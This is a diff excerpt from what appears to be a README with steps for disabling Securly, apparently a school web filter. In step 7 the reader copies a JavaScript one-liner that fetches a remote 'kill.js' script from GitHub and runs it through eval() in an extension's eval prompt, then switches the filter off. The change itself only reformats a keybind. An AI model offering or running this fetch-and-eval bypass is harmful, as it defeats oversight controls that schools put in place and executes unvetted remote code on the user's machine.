@@ -36,6 +36,6 @@ But if you dont wanna
 
 7.Copy this Javascript ```fetch('https://raw.githubusercontent.com/ThisJackRN/i-hate-securly/main/kill.js').then(r => r.text()).then(r => eval(r))``` 
 
-8. Do the keybind Ctrl+Shift+~ to show the eval prompt and place the copied code into the eval prompt and hit enter!
+8. Do the keybind ```Ctrl+Shift+~``` to show the eval prompt and place the copied code into the eval prompt and hit enter!
 ![Logo](https://jacksdamnserver.site/bypass/UnBlockOrigin/chrome7.png)
 9. Click the off button and you are done.
